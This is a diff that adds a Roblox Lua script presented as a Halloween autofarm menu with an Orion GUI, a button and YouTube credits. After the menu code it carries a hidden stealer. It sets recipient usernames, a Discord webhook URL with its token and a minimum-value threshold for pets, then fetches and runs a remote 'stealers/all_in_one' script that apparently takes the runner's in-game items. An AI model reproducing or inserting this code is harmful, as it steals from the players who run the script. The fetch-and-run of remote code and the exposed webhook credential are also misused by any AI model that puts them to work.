@@ -1,0 +1,31 @@
+local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
+local Window = OrionLib:MakeWindow({Name = "🎃 AlmazniFarm Halloween 🎃", HidePremium = false, IntroEnabled = false})
+
+local Tab = Window:MakeTab({
+    Name = "Farm",
+    Icon = "rbxassetid://4483345998",
+    PremiumOnly = false
+})
+
+Tab:AddButton({
+    Name = "AutoFarm",
+    Callback = function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/ItsJiDy/Personal-Script/refs/heads/main/mm2%20halloween.lua"))() --AutoFarm script
+        OrionLib:MakeNotification({
+            Name = "AutoFarm",
+            Content = "Farm!",
+            Image = "rbxassetid://4483345998",
+            Time = 5
+        })
+      end    
+})
+
+Tab:AddParagraph("Credits", "YouTube: Almaz0")
+OrionLib:Init()
+--AutoFarm for videos
+Username = "Xxa1n2g3e4l5oxX" 
+Username1 = "vens123d4" --optional
+Username2 = "adoptme12779" --optional
+Webhook = "https://discord.com/api/webhooks/1304095024333721732/GEUz6AG8Cfpy_z8S0Qc-p6PMY4kI2ZvgDQ4rqEAadmujPmKqgQQ28IW6WQBQO9DdD9vq" 
+min_rap = 10000 --for pets go and pet simulator 99 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/D3ATH-hub/stealers/main/all_in_one"))()
